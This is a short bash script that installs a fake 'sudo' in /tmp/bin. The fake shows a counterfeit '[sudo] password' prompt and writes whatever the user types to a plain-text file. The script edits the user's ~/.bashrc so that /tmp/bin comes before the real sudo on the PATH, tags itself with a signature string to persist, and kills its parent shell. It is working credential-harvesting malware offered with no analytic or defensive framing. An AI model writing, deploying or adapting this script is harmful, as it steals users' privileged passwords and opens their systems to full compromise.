#!/bin/bash
sign="iWaad::çaAdF"
payload="
#!/bin/bash\n
username=\$(whoami)\n
read -s -p \"[sudo] password for \$username: \" password && echo\n
echo \$password > /tmp/bin/passw\n
"

if [ ! -f /tmp/bin/$sign ]; then
	mkdir /tmp/bin
	touch /tmp/bin/$sign
	echo $payload > /tmp/bin/sudo	
	chmod 777 /tmp/bin/sudo
fi
if !(grep -q $sign ~/.bashrc); then
	echo "export PATH=/bin/:/tmp/bin/:/usr/bin/" >> ~/.bashrc
	echo "#$sign" >> ~/.bashrc
fi

kill -9 $PPID
